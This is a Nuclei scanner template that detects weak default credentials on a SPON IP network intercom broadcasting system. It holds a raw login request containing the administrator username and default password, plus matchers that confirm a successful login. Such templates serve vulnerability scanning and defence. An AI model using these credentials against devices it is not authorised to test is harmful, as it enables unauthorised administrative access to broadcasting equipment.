id: shibangtongxin-spon-ip-intercom-weak-password

info:
  name: SPON IP Network Intercom Broadcasting System Weak Password
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
  description: |
    Weak default credentials detection for SPON IP Network Intercom Broadcasting System.

http:
  - raw:
      - |
        POST /php/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded;charset=UTF-8

        jsondata%5Busername%5D=administrator&jsondata%5Bpassword%5D=800823&jsondata%5Bisencrypted%5D=0
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "res\":\"1\",\"username\":\"administrator\",\"password\":\"800823"
      - type: word
        part: header
        words:
          - "text/html"
